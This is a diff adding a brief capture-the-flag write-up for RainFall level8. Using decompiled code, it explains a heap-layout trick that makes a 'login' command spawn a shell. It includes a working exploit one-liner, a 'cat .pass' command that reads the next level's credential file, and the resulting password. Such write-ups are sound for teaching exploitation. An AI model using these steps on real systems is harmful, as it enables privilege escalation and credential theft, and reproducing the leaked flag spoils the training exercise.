@@ -1,0 +1,63 @@
+onthis level we have only function main
+
+the assembly is not easylly readable so using ghidra we retrieve a readble source 
+
+we see that its and infinite loop that wait for input, 
+then it compare the input with the strings  "auth " "reset" "service" and "login"
+
+login instantly segfault
+because of the condition 
+      
+	  
+	  if (auth[8] == 0) {
+        fwrite("Password:\n",1,10,stdout);
+      }
+      else {
+        system("/bin/sh");
+      }
+
+we have these junks that are actually strncmp(input, "login", 5)
+
+    pbVar6 = (byte *)"login";
+    do {
+      if (iVar3 == 0) break;
+      iVar3 = iVar3 + -1;
+      uVar11 = *pbVar5 < *pbVar6;
+      uVar8 = *pbVar5 == *pbVar6;
+      pbVar5 = pbVar5 + (uint)bVar12 * -2 + 1;
+      pbVar6 = pbVar6 + (uint)bVar12 * -2 + 1;
+    } while ((bool)uVar8);
+
+
+
+(gdb) info variables
+	0x08049aac  auth
+	0x08049ab0  service
+
+
+we have these two global variable that are printed in the beginning of the program
+
+printf("%p, %p \n",auth,service);
+
+each time we call "auth " or "service" the value printed is increased by 16 bytes
+
+so we might check the condition if we fill enough bits by calling auth and service
+
+	  if (auth[8] == 0) {
+        fwrite("Password:\n",1,10,stdout);
+      }
+      else {
+        system("/bin/sh");
+      }
+
+	  and make auth[8] != 0
+
+level8@RainFall:~$ (python -c 'print("auth \n"*2+"service\n"*2+"login")' ;cat) | ./level8
+(nil), (nil) 
+0x804a008, (nil) 
+0x804a018, (nil) 
+0x804a018, 0x804a028 
+0x804a018, 0x804a038 
+cd ../level9 ; cat .pass
+c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
+
